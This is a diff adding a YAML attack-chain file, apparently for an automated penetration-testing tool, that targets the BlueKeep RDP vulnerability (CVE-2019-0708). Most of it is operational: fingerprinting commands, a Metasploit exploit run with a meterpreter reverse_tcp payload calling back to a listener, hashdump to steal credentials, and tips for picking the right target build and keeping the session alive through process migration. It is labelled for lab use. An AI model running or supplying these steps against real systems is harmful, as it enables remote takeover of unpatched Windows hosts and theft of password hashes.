@@ -1,0 +1,75 @@
+chain_id: bluekeep_cve_2019_0708
+title: "Microsoft RDP — CVE-2019-0708 BlueKeep pre-auth wormable RCE"
+severity: CRITICAL
+tags: [rdp, windows, cve-2019-0708, bluekeep, rce, unauth, wormable, kernel]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2019-0708" }
+    - { port: 3389, service_pattern: "(?i)ms-wbt-server|rdp" }
+    - { product_pattern: "(?i)microsoft terminal services|rdp" }
+
+description: |
+  Windows XP / Vista / 7 / Server 2003 / Server 2008(R2) Remote
+  Desktop Services accept a malformed channel-bind request on the
+  MS_T120 channel before authentication, leading to a use-after-
+  free in `termdd.sys` and SYSTEM-level kernel RCE. Wormable —
+  the reason Microsoft back-ported the fix to XP. The public
+  Metasploit module is unstable but reliable enough for Lab
+  / OSCP-tier targets; failure leaves a BSOD, not a foothold.
+
+steps:
+  - id: 1
+    title: "Cheap fingerprint with nmap NSE"
+    command: |
+      nmap -p 3389 -sV --script rdp-vuln-ms12-020,rdp-ntlm-info $VICTIMA
+      # rdpscan is more accurate for BlueKeep specifically:
+      git clone https://github.com/robertdavidgraham/rdpscan /tmp/rdpscan
+      make -C /tmp/rdpscan
+      /tmp/rdpscan/rdpscan $VICTIMA
+
+  - id: 2
+    title: "Verify with the Metasploit aux module (no exploit yet)"
+    command: |
+      msfconsole -qx 'use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; \
+        set RHOSTS $VICTIMA; run; exit'
+
+  - id: 3
+    title: "Exploit (lab targets only — known to BSOD on miss)"
+    command: |
+      msfconsole -qx 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; \
+        set RHOSTS $VICTIMA; \
+        set TARGET 2; \
+        set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 4
+    title: "Post-foothold sanity"
+    command: |
+      # In the meterpreter session:
+      getuid
+      sysinfo
+      hashdump
+
+common_errors:
+  - error: "module reports SAFE — Target_NOT_VULNERABLE"
+    solution: |
+      Either patched (KB4499175 / KB4499180) or NLA is enforced.
+      With NLA on, BlueKeep is not exploitable pre-auth — you need
+      valid credentials first, at which point use evil-winrm /
+      RDP directly instead.
+  - error: "BSOD on every attempt"
+    solution: |
+      The TARGET parameter must match the exact build. `set TARGET
+      ?` lists the seven supported variants. Run `systeminfo` from
+      a foothold or check `nmap -sV -p 3389` banner to pick the
+      right one before firing.
+  - error: "session dies seconds after open"
+    solution: |
+      Migrate immediately: `migrate -N spoolsv.exe`. The vulnerable
+      kernel pool is unstable post-exploit and the original
+      injectee process is the first to die.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2019-0708
+  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708
